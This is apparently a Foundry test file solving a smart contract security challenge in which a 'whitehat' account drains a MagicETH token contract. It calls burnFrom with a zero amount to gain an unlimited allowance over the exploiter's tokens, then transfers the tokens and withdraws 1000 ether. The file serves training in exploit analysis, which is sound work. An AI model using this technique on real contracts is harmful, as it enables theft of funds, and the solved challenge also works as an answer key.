// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge1Test is Test {
    MagicETH public mETH;

    address public exploiter = makeAddr("exploiter");
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        mETH = new MagicETH();

        mETH.deposit{value: 1000 ether}();
        // exploiter is in control of 1000 tokens
        mETH.transfer(exploiter, 1000 ether);
    }

    function testExploit() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge1Test -vvvv //
        ////////////////////////////////////////////////////*/

        // Step 1: approve exploiter to spend whitehat with maximum allowance
        mETH.approve(exploiter, type(uint256).max);

        // Step 2: burn 0 amount from exploiter but approve whitehat to spend exploiter with maximum allowance
        mETH.burnFrom(exploiter, 0);
        assertEq(mETH.balanceOf(exploiter), 1000 ether, "exploiter should have 1000 mETH");
        assertEq(mETH.allowance(exploiter, whitehat), type(uint256).max, "allowance should be max");

        // Step 3: transfer 1000 tokens from exploiter to whitehat
        mETH.transferFrom(exploiter, whitehat, 1000 ether);
        assertEq(mETH.balanceOf(whitehat), 1000 ether, "whitehat should have 1000 mETH");

        // Step 4: withdraw 1000 ether from mETH
        mETH.withdraw(1000 ether);

        //==================================================//
        vm.stopPrank();

        assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
    }
}
